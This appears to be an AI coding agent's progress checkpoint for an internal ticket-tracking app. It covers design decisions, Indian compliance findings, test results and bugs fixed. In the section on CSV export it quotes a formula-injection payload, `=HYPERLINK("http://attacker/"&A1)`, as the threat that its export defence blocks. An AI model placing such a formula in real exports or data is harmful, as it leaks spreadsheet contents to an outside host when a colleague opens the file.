# IONIC_CRM — Progress Checkpoint

**Goal:** Internal ticket/status-tracking web app for ~10–50 Ionic Wealth employees. Tickets with deadlines, append-only status punches, manager/admin dashboards. Zero rupees. Maximum defensible compliance posture.

**Last updated:** 2026-08-03 · **Stage:** M1–M10 built and tested. M11 (production adapter, deploy, pilot) blocked on the Principal's Supabase/Cloudflare accounts. Design docs remain unreviewed by the Principal.

> ⚠ **Three open problems found 2026-08-03 by the handover-doc pass. Read these before anything else.**
>
> 1. **A live GitHub Personal Access Token is embedded in plaintext in `.git/config`** (`remote.origin.url`). It is readable by anything that can read the working tree, it appears in any `git remote -v` output, and it has now been printed to at least one terminal. **It should be revoked and reissued**, with the remote re-pointed at a token-free URL and a credential helper used instead. Not actioned here: rotating someone's credentials is the Principal's call, not an agent's.
> 2. **The whole project is committed to the wrong repository — and mostly not committed at all.** `origin` is `shreyas1gupta-wq/ionic-scorecard`, a **personal** account, for an unrelated product. Only 3 files under `IONIC_CRM/` exist at HEAD; `app/`, `research/`, `PLAN.md` and `HANDOVER.md` are untracked. So the code exists on exactly one laptop, inside a OneDrive folder. DESIGN §10's "repo under a company GitHub account" mitigation is not merely incomplete — the current state is worse than the risk register describes.
> 3. **The `node_modules` junction is gone, so it is syncing to OneDrive again.** Verified: not a reparse point, 75 items in the repo folder against 49 in `%LOCALAPPDATA%\ionic_crm\node_modules`. Installing `next`/`react`/`jose` replaced the junction with a real directory. **My earlier "OneDrive resolved, no decision needed" claim is therefore false as of now** — it was true when made and was undone by a later `npm install`. It is still correctly gitignored, so nothing is being committed; the cost is sync thrashing. Re-create the junction after any `npm install`, or accept the thrash — see `app/README.md` for the commands and the `fsutil reparsepoint query` check.

---

## Documents

| File | What it is | State |
|---|---|---|
| `REQUIREMENTS.md` | What the system must do. Technology-free. | Draft, reconciled against DESIGN |
| `DESIGN.md` | How. Architecture, data model, security, compliance. | Draft |
| `PROGRESS.md` | This checkpoint | Live |
| `PLAN.md` | Ordered implementation milestones | Not yet written |

---

## Settled decisions

| # | Decision | Reasoning |
|---|---|---|
| D1 | **GitHub is NOT the database** | Git history is permanent → right-to-erasure unachievable. No row-level access control (repo read = every ticket, all history). Concurrent writes = merge conflicts. Pages is static-only and not gate-able on free. |
| D2 | **GitHub IS the encrypted backup target** | Nightly `pg_dump` → age-encrypted → private repo. Ciphertext in git history is harmless; permanence becomes an asset. **Now load-bearing, not optional**: Supabase Free has *no* automated backups and *no* PITR `[DATA]`. |
| D3 | **Excel on the company drive is NOT the backend** | Single-file lock, no row-level lock or atomic append → conflicted copies at 10–50 writers. Permissions all-or-nothing. Unreachable from an internet-hosted app. Silently editable → destroys the audit case. Scale is *not* the objection. |
| D4 | ~~Email OTP via Brevo~~ → ~~admin passwords + TOTP~~ → **Cloudflare Access email One-Time PIN** | **Revised twice; now final.** Cloudflare sends the PIN from *its own* infrastructure, so the SPF/DKIM problem on `ionic.in` never arises. No IdP, no DNS, no passwords, no OTP code to write. Works on `*.pages.dev` `[DATA]`. Deletes an entire category of code. |
| D5 | **Tamper-evidence via hash-chained audit log; erasure via pseudonymisation** | Each row hashes the previous; daily root hash anchored in the backup repo so even a DB admin can't rewrite undetected. Employee erasure by pseudonymisation, not crypto-shredding — shredding a name the UI renders constantly is theatre. |
| D6 | **Data layer behind one repository interface** | Nothing touches the store directly. A later move to SharePoint = one adapter, not a rewrite. This is what makes "build now, involve IT later" safe. |
| D7 | **Three scope rules: no client identifiers, no investment reasoning, no client complaints** | Expanded from "no PII" after the SEBI research. See D11. |
| D8 | **BUILD, do not fork** | The append-only punch *is* the product and no fork provides it — patching someone else's ORM to revoke edit/delete means inheriting their maintenance burden *and* writing custom code, with the patch fighting every upgrade. In a build it is revoked table privileges. Also: Peppermint archived Jul-2026, Focalboard unmaintained `[DATA]` — both looked reasonable recently. |
| D9 | **Supabase Postgres `ap-south-1` (Mumbai), not Cloudflare D1** | D1 cannot be pinned to India (`eu`/`fedramp` only; hints don't guarantee placement) `[DATA]`. CERT-In 2022 requires ICT logs in Indian jurisdiction for 180 days `[DATA]`. |
| D10 | **No app session layer** | Access re-asserts identity per request via signed JWT. A second cookie session = two sources of truth and a new bug class. Session duration is an Access policy setting. |
| D11 | **Encrypt `client_ref` only in V1; notes stay cleartext** | Encryption and full-text search are in genuine tension. Search wins for V1 usability. Stated openly in DESIGN §7 rather than assumed away. WebCrypto AES-256-GCM in the Worker — *not* pgsodium/Supabase TCE (vendor says "does not recommend", pending deprecation, "unrecoverable issues") `[DATA]`. |
| D12 | **Disable `workers.dev`** | Access enforces on a *hostname*. A Worker is also reachable at `*.workers.dev` unless disabled — that URL bypasses the whole auth layer. Three layers: config, fail-closed JWT check, and a test asserting non-200. **The single highest-severity item in the design.** |

## ⚠ 2026-08-03 — adversarial verify pass overturned 18 claims

The 11-agent research workflow completed. Its synthesis agent died mid-stream, but the **verify pass had refuted 18 claims** across all four fact-heavy dimensions. Corrections extracted to `research/VERIFY_CORRECTIONS.md` (68 KB, full sources) and applied to DESIGN + REQUIREMENTS. **Six were claims I had already written into the design.** Recorded rather than quietly edited:

| # | What I said | What is actually true |
|---|---|---|
| 1 | DPDP obligations frame the compliance posture | **DPDP is not in force.** Rules 2025 Rule 1(4): rules 5–16 commence **18 months** after 13/14-Nov-2025 → **~14 May 2027**. No DPDP erasure right and no retention floor today. Live regimes are **CSCRF + CERT-In + IT Act s.43A/SPDI 2011**. |
| 2 | CERT-In requires ICT logs held **in India** — the reason for Mumbai | **Wrong.** CERT-In FAQ Q35: *"The logs may be stored outside India also as long as the obligation to produce logs … is adhered to."* Producibility, not residency. Mumbai is still fine; the *justification* changed to the CSCRF localisation abeyance, which a circular can lift. |
| 3 | 180 days is the log-retention number to build to | **Wrong by 4x.** CSCRF PR.AA guideline 1(e), **All REs Mandatory**, not exempted: access logs *"not less than two (2) years (atleast 6 months in online mode and rest in archival mode)"*. No free tier does this → new `access_events` table. |
| 4 | Reg 29's preserved set is "a closed enumeration" in Reg 27(1) | **Wrong — false comfort.** Reg 29 preserves everything in **Chapter IV (Regs 21–34)**, a subject-matter set: also complaints (24(10)), client-wise accounts and client reports (30–31). Scope rules widened from three to five. |
| 5 | "Keep the app **out of** CSCRF scope by design" | **Reversed.** CSCRF FAQ Q8: scope follows *what the system is used for*. A tracker holding NDPMS deliverables is in scope with or without client names. Correct target: **in scope, classified non-critical** (FAQ Q10), in the asset inventory (Q9). |
| 6 | Supabase Free has **no DPA** | **Wrong.** The Supabase DPA has no plan restriction — EU SCCs, 48-hour breach notice. Paid-gated items are SOC 2 / ISO 27001 / HIPAA and **Platform Audit Logs**. Also: GitHub Free orgs *do* get a 180-day audit log; only API access is gated. |

**New constraints the pass added:**

- **PR.IP.S15**, All REs Mandatory and **not exempted**: in-house developed software requires compliance certification *"submitted by CERT-In empanelled IS auditing organization"*. The one unavoidable rupee cost — and only if the app is in scope.
- **A non-individual Investment Adviser is a Small-size RE by STATUS, no AUM threshold** — worse than a sub-₹3,000 cr PM, because Small-size gets **no** cyber-audit exemption. The bucket cannot be inferred from the PM side.
- **SEBI has its own 6-hour incident clock** (`mkt_incidents@sebi.gov.in`) plus 24 hours on its portal, parallel to CERT-In's. The trap: *noticing* starts the clock, and an unmonitored app cannot notice. **A staffing obligation, not a code one.**
- **SEBI Outsourcing Guidelines (CIR/MIRSD/24/2011)** — requires a legally binding contract, SEBI right of access to provider data "at any point of time", audit rights, data-preservation covenants. A click-through free-tier ToS satisfies none. **The cleanest reason a free tier can't hold in-scope data.**
- **Hard architectural rule:** no integration, data feed, shared credential or link to any SEBI-purview system, or FAQ Q27 pulls this app in as a *connected system*. **This is in tension with the Entra SSO graduation path** — flagged, not resolved.
- **RA Reg 25(1)(vii)** (added 16-Dec-2024) captures *"records of communication … with all clients including prospective clients"* — a wider trapdoor than investment reasoning, if the firm holds RA registration.
- **⚠ MeitY consulted Jan-2026 on advancing DPDP Phase 3 to 12 months** → possibly **13 Nov 2026**, ~3 months out. Status UNVERIFIED. Re-check the e-Gazette.
- **`age` post-quantum keys** are far longer than one line and break the paper-escrow design; `typage` PQ interop UNVERIFIED → **pin to classic X25519**.
- Mitigating, and honest: employee name / work email / task history are **not** "sensitive personal data" under SPDI Rule 3, so today's live privacy burden is genuinely light.

**The one lookup that settles everything, and it is public:** Ionic Wealth's SEBI registration set (`sebi.gov.in/intermediaries`) + AUM (APMI disclosures). Until pulled, the CSCRF bucket — and therefore VAPT-only vs VAPT-plus-audit vs PR.IP.S15 — is undetermined. Now check 0 in DESIGN §9.

## Compliance findings that changed the design

- **DPDP s.16(1) is a negative list, not localisation** `[DATA]`. No restricted countries notified → "data must be in India" is *not* a DPDP requirement. CERT-In's 180-day log rule is what drives Mumbai, not DPDP.
- **Portfolio Managers are covered by CSCRF** `[DATA]`, but **a PM can never be a Qualified RE** — so no CCI, ISO 27001, red teaming or threat hunting, ever. At ≤ ₹3,000 cr AUM the firm is a **Self-certification RE**: VAPT only, *"no other audit is required"*, plus an Annexure-P signed by MD/CEO/Partner/Proprietor `[DATA]`.
- **The CSCRF exemptions are conditional on Market SOC onboarding** `[DATA]`. Unknown for this firm → open question 5.
- **Encryption at rest is exempted** for self-certification/small-size REs `[DATA]`. We do it anyway.
- **API rate limiting and throttling *is* required** `[DATA]` → became a build item.
- **Half-yearly access-rights review + annual recovery drill apply to all REs** `[DATA]` → became features, not intentions.
- **SEBI's Cloud Services Framework does not list Portfolio Managers** `[DATA, secondary source — verify]` → hosting is not constrained by it.
- **SEBI Reg 27(1)(e) and Reg 11(d) are the two trapdoors.** Investment reasoning in a punch note → 5-year preservation + Principal Officer custody. A client complaint logged as a ticket → the firm's complaints register. Hence D7.
- **Supabase Free has no DPA, SOC 2 or ISO 27001** `[DATA]`. Under DPDP the firm is Data Fiduciary and Supabase a Processor; that relationship normally rests on a contract, and on free tier there is none. A real gap, disclosed not engineered around.
- **SharePoint List route is architecturally excellent but IT-gated.** Per-item ETag concurrency, version history, Entra-bound Person columns `[DATA]`. But default managed user-consent excludes `Sites.ReadWrite.All`, `Sites.Selected` is worse for self-service, and the `appregnew.aspx`/ACS escape hatch **died 2 April 2026** `[DATA]`. One IT ticket, not a rebuild.

## Confirmed context

- Company on **Microsoft 365**; IT involvement **not** available for now (Principal's call) → graduation path to SharePoint + Entra SSO exists and D6 protects it.
- 10–50 users. Budget **₹0**, hard. Frontend must be a proper website.
- Effort estimate: **~10–15 sessions ≈ 40–80 hours**, roughly 4–8 weeks of evenings.

---

## DONE

- [x] Options survey (4 routes) · GitHub-as-DB answered · Excel-on-drive answered
- [x] 17 research agents across 8 dimensions, all with adversarial verify passes; primary sources parsed in full (DPDP Act + Rules 2025, PMS Regs 2020, RA Regs 2014, 205pp CSCRF + 2 clarifications, CERT-In 2022, SCORES)
- [x] `REQUIREMENTS.md` — and reconciled against DESIGN (5 contradictions from the pre-research draft fixed)
- [x] `DESIGN.md` — architecture, auth, data model, append-only enforcement, hash chain, encryption, compliance, risks, open decisions
- [x] `PLAN.md` — 13 milestones, each with a stated verification
- [x] **M0 toolchain** — Node v24.18.1 + npm 11.16.0 user-local at `%LOCALAPPDATA%\nodejs`, on the user PATH, no admin rights. npm registry reachable through the proxy.
- [x] **M1 domain core — VERIFIED: 107 tests passing, `tsc --noEmit` clean.**
  `app/src/domain/`: `calendar.ts` (IST dates, working-day arithmetic, injected holidays) · `tickets.ts` (transition table, overdue, stale, dual on-time) · `hash-chain.ts` (canonical JSON, canonical timestamps, chain verify with external anchors) · `ticket-ref.ts`.
  Tests specifically cover the cases that would make the design decorative: the 18:30 UTC IST boundary in both directions, deadlines on Saturdays and holidays, all 8 legal transitions and every illegal one, a deleted audit row **resequenced to hide the gap** (detected), tail truncation (detected only via anchor), and a full privileged rewrite (undetectable internally, detected by anchor — the honest limitation, now proven rather than asserted).

## M0/M1 lessons worth keeping

- **Node installs fine without admin**: official zip + `tar.exe` (~35s). `Expand-Archive` takes **over five minutes** on this file — do not use it.
- **The proxy truncates long downloads and does not support byte-range resume.** Download with retries and gate on the published SHA-256. My first attempt produced a plausible-looking 35.45 MB file that failed its checksum; extracting it unverified would have been the mistake.
- **PowerShell reports exit −1 for npm** because npm writes notices to stderr. Not a failure — check the actual output.
- **⚠ `node_modules` sits inside a OneDrive-synced folder.** It is gitignored, but gitignore does not stop OneDrive, and ~54 packages of small files will thrash sync. **Mitigation needed** (pick one): right-click `IONIC_CRM\app\node_modules` → *Free up space* / exclude from sync, or move development to `c:\tmp\ionic_crm` and use git as the sync path. Not yet actioned — flagged for the Principal.

## M2 — DONE. VERIFIED: 152 tests passing (107 domain + 45 database), `tsc --noEmit` clean

**Scope simplification (Principal, 2026-08-03): general task tickets, not client-linked records.** So V1 has **no `client_ref`, no encrypted column, no `dek_keyring`, no key management**. This removed the single largest source of operational risk in the design — a lost or mis-rotated KEK makes data unrecoverable. DESIGN §7 retains the encryption spec *unbuilt*, for if a client reference is ever added.

**Ten tables**, three migrations in `app/db/migrations/`:
- `0001_schema.sql` — tables, roles, identity helpers, write-once triggers
- `0002_append_only.sql` — privilege revokes, mutation triggers, the lock-holding audit appender
- `0003_rls.sql` — RLS policies, grants, ticket-ref allocator

**Tested on PGlite (PostgreSQL 18.3 compiled to WASM — real Postgres, no server, no admin rights).** What the 45 tests actually prove:

- **The harness is honest first.** Superusers bypass RLS, so before any authorisation test means anything, three tests assert that `set local role crm_app` really took effect and that the role is neither superuser nor `BYPASSRLS`. Without those, every RLS test below would pass while proving nothing.
- **Append-only holds against the owner, not just the app.** UPDATE, DELETE and TRUNCATE on `status_updates` and `audit_log` are rejected for `crm_app` *and* for the owner — the privilege layer stops one, the trigger layer stops the other. Even a no-op `UPDATE … WHERE false` is refused.
- **`audit_log` INSERT is not granted to the app at all**; writes go only through a `SECURITY DEFINER` function holding a transaction advisory lock.
- **Isolation is real:** Alice cannot see Bob's ticket or his punches; the manager sees both reports; an unrelated employee sees nothing; a watcher sees the one ticket they watch; admin sees all; the audit log is admin-only.
- **Identity cannot be forged:** a punch with someone else's `actor_id`, a punch on an invisible ticket, and a ticket raised in another person's name are all rejected by RLS `WITH CHECK`.
- **Write-once columns:** `original_deadline`, `ref` and `raiser_id` all refuse to change; the current deadline still moves.
- **The chain agrees across languages** — the TypeScript hasher and the SQL writer produce a chain that `verifyChain()` accepts, and the concurrent-writer case (stale `prev_hash`) and a seq gap are both refused.

### Three bugs found and fixed by building it

1. **`append_audit` let Postgres default `occurred_at`** while the app hashed its own value — so the stored row would never match its hash and every verification would fail for a reason nobody could locate. Now `occurred_at` and `seq` are both caller-supplied and cross-checked under the lock.
2. **`LANGUAGE sql` function bodies are validated at CREATE time**, unlike plpgsql. The identity helpers referenced `employees` before the table existed, so migration 0001 failed outright. Helpers that read tables now come after them.
3. **`FORCE ROW LEVEL SECURITY` was in the design and is deliberately not in the build.** Forcing would apply policies to the owner and break migrations, seeding and the archival job. The stronger control is that the runtime role `crm_app` owns nothing, so ordinary RLS binds it — "the app never connects as owner" beats "we remembered to force it". DESIGN updated to match.

## M3 — repository seam DONE. VERIFIED: 206 tests passing, `tsc --noEmit` clean

**OneDrive junction — worked, then was silently undone.** `node_modules` was moved to `%LOCALAPPDATA%\ionic_crm\node_modules` with a **Windows junction** left in its place; OneDrive does not follow reparse points and junctions need no admin rights. All 152 tests were re-verified through it.

**It did not survive.** A later `npm install` (adding `next`/`react`/`jose`) replaced the junction with a real directory, so `node_modules` is inside OneDrive again — verified 2026-08-03, see the warning at the top of this file. The lesson is the useful part: **the junction is not durable across `npm install`**, so it has to be re-created afterwards or the trick cannot be relied on. `app/README.md` documents the commands and how to check which state it is in.

**The seam** — `app/src/repo/`:
- `types.ts` — entities, ports, `AuthorizationError` / `ValidationError`
- `postgres.ts` — the real adapter
- `memory.ts` — in-memory implementation, not a mock
- `contract.test.ts` — **one suite, 27 rules, run against BOTH: 54 tests**

Two design rules make the seam load-bearing rather than ceremonial:

1. **Identity is bound at construction, not passed per call.** A repository is only obtainable via `withActor`, which under Postgres opens the transaction, sets the identity GUC and drops to `crm_app`. There is no method a caller could forget to authorise, and no path to the database that skips RLS.
2. **The actor carries an id and no role.** If a caller could assert "I am an admin", eventually that claim would be believed. Role is always read from the store.

The Postgres adapter deliberately does **not** re-check authorisation in JavaScript — the database is the authority, and duplicating the rules would create a second place to get them wrong. What it does instead is translate Postgres' refusals (SQLSTATE 42501, RLS violations, check violations) into the same domain errors the fake raises, which is what lets one contract suite cover both.

**Why the contract test matters:** a fake whose behaviour is merely *believed* to match the database is worse than no fake — it makes the fast tests green while the real thing refuses. Every rule is now asserted twice, so divergence fails here instead of in production.

### Two problems found and fixed

1. **Test files running in parallel killed the worker** with `ERR_IPC_CHANNEL_CLOSED` — which looks nothing like the out-of-memory failure it actually is. Each PGlite instance carries a whole Postgres WASM heap, and the DB suites create one per test. Fixed with `fileParallelism: false` in `vitest.config.ts`, documented so nobody "optimises" it back.
2. **Per-test migration cost 800 ms.** Now the migrated-and-seeded state is captured once as a PGlite data-directory snapshot and cloned per test → **300 ms**, a 2.4× cut. Fresh-database-per-test is kept rather than truncating between tests, because the schema deliberately offers no way to delete a punch — using an escape hatch for test convenience would be using one an attacker could use too.

## M3 + M4 + M5 (logic) — DONE. VERIFIED: **342 tests passing**, `tsc` clean, `next build` clean, app runs

| Suite | Tests | Covers |
|---|---|---|
| `domain/*` | 107 | IST dates, working-day maths, transitions, hash chain |
| `db/schema` | 45 | RLS, append-only, immutable columns, chain via SQL |
| `repo/contract` | 98 | **49 rules × 2 implementations** |
| `service/tickets` | 50 | **25 rules × 2 implementations** |
| `auth/auth` | 42 | JWT forgeries, config guards, identity resolution |

**It is a working website.** `npm run dev` is ready in ~2s and `/tickets` renders the shell, signed-in user, seeded tickets with real refs, priority/status tags and working-days-remaining computed through the domain code. All six security headers verified on the live response.

**M4 auth.** Cloudflare Access email OTP, verified with `jose` rather than hand-rolled. Tests cover the forgeries that matter: `alg: none`, algorithm confusion (HS256 offered where RS256 is expected), a token minted for a *different* Access application in the same team, wrong issuer, expiry, tampered payload, missing email claim. The app **refuses to boot** if the dev-identity variables are set with `NODE_ENV=production`. Unknown and deactivated employees return an identical error, so the endpoint cannot enumerate staff.

**M5 logic.** `src/service/tickets.ts` — a status change and its punch are one operation, so a ticket cannot move without a record of why; reassignment requires a handover note *recorded as a punch* where the next person will read it; a deadline cannot move until at least one punch exists; every operation appends to the hash chain. A full lifecycle test (create → start → block → unblock → request → approve → reassign → done) leaves a chain that verifies with 8 entries.

### Decisions and honest limits recorded while building

- **`resolveIdentity` is the one pre-authorisation query in the system** — `app.resolve_identity()`, SECURITY DEFINER, returns at most one row, ACTIVE only, cannot enumerate. Offboarding therefore takes effect immediately with no separate check to forget.
- **`occurred_at` must be read and written as an exact canonical string.** It is inside the audit hash, and a driver returning a JS `Date` truncates Postgres' microseconds to milliseconds — which would make every verification fail with no visible cause. Both the writer and `AUDIT_COLUMNS` use `to_char`.
- **The "punch before moving a deadline" rule is enforced as "at least one punch exists".** A stricter reading ("a punch since the last move") needs a total ordering between punches and deadline changes that the schema does not provide, so it would be guesswork dressed as a rule. Stated in the code.
- **The raiser cannot write the ticket.** Raising work does not confer control over how it is done — asserted in both the RLS policy and the contract suite.
- **An UPDATE matching no row returns one indistinguishable error** whether the row is missing, invisible, or forbidden. Distinguishing them turns an update endpoint into an existence oracle.
- **Local dev defaults to the in-memory store.** Measured, not assumed: the machine had **2.3 GB free of 15.6 GB**, and PGlite inside the Turbopack dev server exhausted V8's allocator outright. `CRM_DEV_STORE=pglite` is the opt-in for verifying policy or migration changes. The fake is only safe because the contract suite proves it matches — and it **cannot** catch an RLS mistake, which is why policy changes need pglite mode or the tests.
- **Test isolation:** one shared database, transactional data wiped between tests by briefly disabling the append-only triggers **as the table owner** — unreachable from the app, which owns nothing, and `schema.test.ts` still proves the owner cannot delete a punch in normal operation. Cut the contract suite from 23s to under 7s.
- **`ERR_IPC_CHANNEL_CLOSED` is out-of-memory in disguise.** Cost real time; documented in `vitest.config.ts` so nobody "optimises" `fileParallelism: false` back.
- **A wrong turn worth recording:** I first "fixed" the memory problem by marking PGlite external in the vitest config on a hunch about the parser. It made both database suites fail *alone* when they had been passing. Reverted, then diagnosed properly by running each file in isolation.

## M5 — COMPLETE. VERIFIED: **349 tests**, `tsc` clean, `next build` clean, all routes serving

Three routes live: `/tickets`, `/tickets/new`, `/tickets/[ref]`.

**The end-to-end security proof, from a real HTTP request:**

| Route | Result |
|---|---|
| `/tickets/TKT-2026-0001` (Alice's own) | **200** |
| `/tickets/TKT-2026-0003` (Bob's) | **404** |
| `/tickets/TKT-9999-0001` (does not exist) | **404** |

A ticket that exists but is not yours returns *exactly* what a non-existent one returns. No existence oracle — and that is RLS working through the UI, not only in tests.

**Server actions** (`app/tickets/actions.ts`) are the only write path. Each authenticates, runs in a transaction with RLS in force, delegates rules to the service, and records an access event. None accepts an actor id — identity comes from the verified request, never the payload.

**Forms.** The punch form is deliberately short: only status and a note are prominent, because a form asking for eight fields gets filled in once and then avoided, and a tool nobody punches into is worse than no tool. The blocked-reason field appears only when it is required. Status options come from `legalTransitions()`, derived from the same table the service validates against — so the UI can never offer a control that fails when clicked, and a new transition cannot leave one of them stale. A test asserts that agreement across every status and role combination.

### More recorded decisions

- **`redirect()` works by throwing**, so the action error handler re-throws anything carrying a Next.js digest. Swallowing it would make successful submissions look like silent failures — a genuinely nasty bug to chase.
- **Access events are recorded on the read path too**, not just writes. CSCRF PR.AA asks who looked at what.
- **Category selection is deliberately absent from the create form.** It needs a `listCategories` port that belongs with admin (M8); half-building it would have been worse than leaving it null.
- **`npm test` now runs four separate vitest invocations.** On this machine (~2.7 GB free of 15.6 GB) three PGlite heaps plus Vite's pipeline in one process exhausts the allocator, surfacing as `ERR_IPC_CHANNEL_CLOSED`. Separate processes let the OS reclaim between suites. `npm run test:all` is the single-process version for a machine with room. Reasoning is in `package.json` so it is not "optimised" away.

## M6 — COMPLETE. VERIFIED: **363 tests**, `tsc` clean, `next build` clean, 5 routes serving

Routes: `/tickets`, `/tickets/new`, `/tickets/[ref]`, `/team`, `/`.

**Stale flagging** needed the last punch per ticket, so `listSummaries()` was added — **one grouped subquery**, not a query per ticket. Fetching N histories to render one page is the classic way a dashboard dies at exactly the moment it starts being used. RLS applies to `status_updates` too, so a ticket you can see but whose punches you cannot aggregates to nulls rather than leaking.

**The team board needs no role check of its own.** `listSummaries` already returns only what RLS permits, so grouping those rows by assignee shows exactly the people the viewer can see: an employee sees themselves, a manager their reports, an admin everyone. A separate "are you a manager" gate would be a second authorisation rule to keep in step with the first, for no gain.

Also added: the `reference.categories()` port and a category picker on the create form (deferred from M5 rather than half-built).

### Decisions and finds

- **`lastPunchDate` is `max(punch_date)`, not the date of the highest-`seq` row.** Those differ when someone backdates an entry, and the later *date* is the honest answer for "has this gone quiet". Asserted in the contract suite for both stores.
- **A stale ticket that was never punched runs its clock from creation**, otherwise a ticket nobody has ever touched would never be flagged — the exact case most worth surfacing.
- **My dev seed was wrong, and the code was right.** Nothing showed as stale because the seeded punches left tickets in `OPEN`, and by design only `IN_PROGRESS`/`BLOCKED` can go stale. Fixed the seed rather than the rule, and it now deliberately covers a healthy ticket, an overdue one, a stale one, and one never touched — a seed where everything looks fine hides exactly the bugs these views exist to surface.

### The memory problem, finally diagnosed properly

`npm test` is now `node scripts/test-all.mjs`, which runs the four suites as separate sequential processes with a short gap.

The root cause was **Windows commit charge, not physical RAM**: the machine showed **3.5 GB free RAM but only 1.8 GB free commit**, and PGlite reserves a large contiguous region that counts against commit. Two suites back-to-back failed while each passed alone. Chaining with `npm run x && npm run y` made it worse, because each nested `npm` keeps its own node process alive for the duration of the child.

The failure presents as `Fatal process out of memory: Zone` then `ERR_IPC_CHANNEL_CLOSED` — neither of which reads as "the OS has not released the last process's commit yet". All of it is written down in `scripts/test-all.mjs`, because the next person to see that error will otherwise lose the same afternoon. `npm run test:all` remains the single-process version for a machine with room.

## M7 — COMPLETE. VERIFIED: **409 tests**, `tsc` clean, `next build` clean, 7 routes

| Suite | Tests |
|---|---|
| unit (domain + auth) | 202 |
| database schema | 45 |
| repository contract | 112 |
| service rules | 50 |

Routes: `/tickets`, `/tickets/new`, `/tickets/[ref]`, `/team`, `/reports`, `/reports/export`, `/`.

**The headline of the reports page is two on-time figures side by side** — against the deadline first promised, and against the deadline as it stood at closing. A tool that reports only the second measures nothing, because the second can be moved. The gap between them, plus the "N tickets have had their deadline moved, totalling M working days of slippage" banner, is the actual finding.

`src/domain/reports.ts` is pure: no clock, no database, no formatting, so all 21 of its tests check hand-worked fixtures. `src/service/reports.ts` is the single place that maps summaries to report rows, so **the page and the CSV can never disagree** — an export that computes differently from the page it sits under is the version that gets emailed to someone.

### Decisions and finds

- **CSV, not `.xlsx`, and it is a deliberate limitation.** A real xlsx writer is a heavy dependency and the Cloudflare Workers free plan caps the script at ~1 MB. Spending most of that budget on spreadsheet formatting is a poor trade for an internal tool. Recorded in `src/domain/csv.ts` rather than left to look like an oversight.
- **CSV formula injection is handled.** A ticket titled `=HYPERLINK("http://attacker/"&A1)` becomes a live exfiltration link when a colleague opens the export. Cells starting `=`, `+`, `-`, `@`, tab or CR are prefixed with an apostrophe. Six tests cover it, including that a negative *number* is left alone — prefixing it would turn a value into text.
- **UTF-8 BOM on the export**, or Excel assumes the system codepage and mangles non-ASCII names.
- **Percentiles are nearest-rank, stated explicitly.** p50 of [1,2,3,4] is 2, not 2.5 — no interpolation, so every number reported is a value that actually happened.
- **Empty groups report `—`, not 0%.** "0% on time" reads as "we never deliver" rather than "nothing closed yet".
- **Cancelled work is excluded from on-time entirely**, or anyone could reach 100% by cancelling whatever they were late on. Tested.
- **A bug I introduced in M6 and caught in M7:** I had used `createdAt.slice(0, 10)` in the team board and ticket list. That is the **UTC** date, a day early for anything raised after 18:30 UTC — precisely the landmine `calendar.ts` exists to prevent, reintroduced by hand two milestones after building the defence. Now `istDateOf(new Date(createdAt))` in all three places, with the reason in a comment at each.
- **A `readonly readonly T[][]` type slipped past vitest** and was caught only by `tsc`/`next build`, because esbuild strips types without checking them. Worth remembering: green tests do not mean the types compile.

### The memory ceiling is now reported honestly

`scripts/test-all.mjs` distinguishes **"could not run: out of memory"** from **"failed"**. Both exit non-zero, and conflating them sends you hunting a bug that is not there — which is exactly what happened to me twice.

On this machine the ceiling is live: at ~1.3 GB free commit charge a single PGlite suite cannot start, and which suite is affected varies run to run. All four pass individually and did so at the last run. On a machine with room, `npm run test:all` runs everything in one process.

## M9 (part) — the audit anchor. VERIFIED: 48 new tests

**This is the piece that makes the whole audit design mean something.** `hash-chain.test.ts` already proved the chain alone *cannot* detect a full rewrite by a database superuser — that limitation is asserted, not hidden. The anchor closes it: each day's head hash is written where the database cannot reach it, so a rewrite must also match a number recorded elsewhere, and cannot.

- `src/domain/anchor.ts` + 35 tests — a dull, line-oriented, greppable format (`anchor/1 <date> <seq> <hash> ok|BROKEN`), chosen because someone will read this file during an incident, possibly without the codebase to hand. Includes `inspectAnchors`, which checks the anchors file *itself*.
- `src/service/anchor-file.ts` + 13 tests **against a real filesystem in a temp directory**, not a mocked `fs` — the properties under test are "it appends rather than rewrites" and "it refuses to write over evidence", and a mocked `fs` would let either be false while the tests stayed green.

Three refusals worth naming, all tested:
- **Two different hashes for the same seq** → refuses and says *escalate*. Either the audit log was rewritten or the anchors file was altered; this is the strongest signal the system can produce and must never pass quietly.
- **A file that already records a problem** → refuses to append, because a valid-looking new line would bury the evidence.
- **A seq behind the last recorded one** → refuses; the audit log cannot shrink.

Plus: idempotent, because scheduled jobs get retried; and it *records* a broken chain rather than refusing to write it, since suppressing that would be the worst possible response.

A test-fixture bug of mine, caught by the suite: my "rejects an upper-case hash" case used `"01".repeat(32)` — no letters, so `.toUpperCase()` changed nothing and the test was vacuously passing the wrong thing. Now uses a hash containing letters.

### M9 remainder is genuinely coupled to M11, and is not being faked

The encrypted `pg_dump` → `age` → private-repo leg and the access-event archival need a live database, plus `pg_dump` and `age` binaries that are not on this machine. The production entry point for both is a **Cloudflare Worker cron handler** — `wrangler.toml` already declares the two triggers — which needs the M11 production adapter. Writing a local script that cannot be run would be worse than recording the dependency.

## M8 + M10 — built by parallel agents, then centrally verified

**FINAL VERIFICATION, all in one run: 584 tests passing, `tsc` clean, `next build` clean, 11 routes + middleware, all routes smoke-tested over HTTP.**

| Suite | Tests |
|---|---|
| unit (domain + auth + security) | 237 |
| database schema | 45 |
| repository contract | 174 |
| service rules (tickets + admin + anchor-file) | 128 |

**M8 admin** — 65 tests against **both** stores. Migration `0005_admin_guards.sql` adds four invariants the schema did not hold: no self-role change (row trigger; not expressible in RLS because `WITH CHECK` cannot see OLD), never hard-deleted, deactivation refused while non-terminal tickets remain assigned, and no manager cycle. Routes `/admin`, `/admin/access-review`, `/admin/audit` all render; the audit viewer shows the chain-verification state and head hash.

**M10 rate limiting** — 29 tests. Fixed window, storage behind an interface mirroring Cloudflare KV's API, LRU-bounded rather than timer-swept (a Workers isolate is not guaranteed to run code outside a request, so `setInterval` can simply never fire). Keys by `CF-Connecting-IP` and deliberately **never** by the forgeable `Cf-Access-Jwt-Assertion` header. HSTS added — the one standard security header that was genuinely missing.

### Three problems found by reviewing the agents' work rather than trusting it

1. **The rate limiter would have taken the app down on a busy morning.** The agent set 120 reads/min sized as though a key were one person. It is not — a corporate network egresses through one NAT address, so "per IP" is "per firm": 50 people at 10 requests/min is 500 from one address against a ceiling of 120. Corrected to a coarse flood guard (2,000/400) with two new tests, one of which asserts the budget is sized for a whole office so nobody "tightens" it back. The genuine per-person layer does not exist yet and is recorded as outstanding — middleware cannot do it, because there is no verified identity at that point.
